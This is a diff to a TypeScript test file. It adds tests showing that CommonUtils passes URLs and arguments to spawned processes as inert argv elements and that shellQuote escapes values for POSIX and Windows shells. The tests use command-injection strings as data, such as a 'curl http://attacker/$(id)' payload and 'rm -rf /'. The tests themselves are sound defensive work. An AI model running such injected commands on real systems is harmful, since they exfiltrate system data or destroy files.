@@ -138,14 +138,18 @@ describe('CommonUtils', () => {
     });
 
     it('Opens a URL in desktop browser', async () => {
-        let launchCommand = '';
         const url = 'http://my.domain.com';
-        stubMethod($$.SANDBOX, CommonUtils, 'executeCommandAsync').callsFake((cmd) => {
-            launchCommand = cmd;
-            return Promise.resolve({ stdout: '', stderr: '' });
-        });
+        const stub = stubMethod($$.SANDBOX, CommonUtils, 'spawnCommandAsync').resolves({ stdout: '', stderr: '' });
         await CommonUtils.launchUrlInDesktopBrowser(url);
-        expect(launchCommand.endsWith(url)).to.be.true;
+        // The URL must be passed as an inert argv element, never concatenated into a shell string.
+        expect(stub.firstCall.args[1] as string[]).to.include(url);
+    });
+
+    it('does not route a malicious URL through a shell when opening the desktop browser', async () => {
+        const malicious = 'http://x/; curl http://attacker/$(id); #';
+        const stub = stubMethod($$.SANDBOX, CommonUtils, 'spawnCommandAsync').resolves({ stdout: '', stderr: '' });
+        await CommonUtils.launchUrlInDesktopBrowser(malicious);
+        expect(stub.firstCall.args[1] as string[]).to.include(malicious);
     });
 
     it('Promise resolves before timeout', async () => {
@@ -333,6 +337,63 @@ describe('CommonUtils', () => {
         ]);
         expect(errorLoggerMock.called).to.be.true;
         expect(errorLoggerMock.getCall(0).args[0]).to.contain('somecommand arg1 arg2');
+    });
+
+    it('spawnWrapper does not route arguments through a shell', async () => {
+        // Spawn a real process that prints its own argv. If a shell were involved, the
+        // command-substitution argument would be evaluated by the shell instead of arriving
+        // as a literal argument. With shell:false it must arrive verbatim.
+        const malicious = '$(echo INJECTED)';
+        const prc = CommonUtils.spawnWrapper(process.execPath, [
+            '-e',
+            'process.stdout.write(process.argv[1])',
+            malicious
+        ]);
+
+        const output: string[] = [];
+        prc.stdout?.on('data', (d: Buffer) => output.push(d.toString()));
+
+        await new Promise<void>((resolve) => prc.on('close', () => resolve()));
+
+        // The argument arrives verbatim; a shell would have evaluated it to 'INJECTED' (or '').
+        const captured = output.join('');
+        expect(captured).to.equal(malicious);
+    });
+
+    it('spawnCommandAsync does not route a malicious argument through a shell', async () => {
+        const fakeProcess = new childProcess.ChildProcess();
+        const spawnStub = stubMethod($$.SANDBOX, CommonUtils, 'spawnWrapper').returns(fakeProcess);
+
+        setTimeout(() => {
+            fakeProcess.emit('close', 0);
+        }, 100);
+
+        const malicious = 'foo; curl http://attacker/$(id); #';
+        await CommonUtils.spawnCommandAsync('somecommand', [malicious]);
+
+        // The malicious value must be passed as a single, inert argv element (never joined into a shell string).
+        expect(spawnStub.getCall(0).args[1]).to.deep.equal([malicious]);
+    });
+
+    describe('shellQuote', () => {
+        it('wraps a POSIX value in single quotes and escapes embedded single quotes', () => {
+            stubMethod($$.SANDBOX, process, 'platform').value('darwin');
+            expect(CommonUtils.shellQuote('foo; rm -rf /')).to.equal("'foo; rm -rf /'");
+            expect(CommonUtils.shellQuote("it's")).to.equal("'it'\\''s'");
+        });
+
+        it('neutralizes command-injection metacharacters on POSIX', () => {
+            stubMethod($$.SANDBOX, process, 'platform').value('linux');
+            const quoted = CommonUtils.shellQuote('$(id)');
+            // Inside single quotes nothing is interpreted by the shell.
+            expect(quoted).to.equal("'$(id)'");
+        });
+
+        it('wraps a Windows value in double quotes and doubles embedded double quotes', () => {
+            stubMethod($$.SANDBOX, process, 'platform').value('win32');
+            expect(CommonUtils.shellQuote('foo bar')).to.equal('"foo bar"');
+            expect(CommonUtils.shellQuote('a"b')).to.equal('"a""b"');
+        });
     });
 
     function createStats(isFile: boolean): fs.Stats {
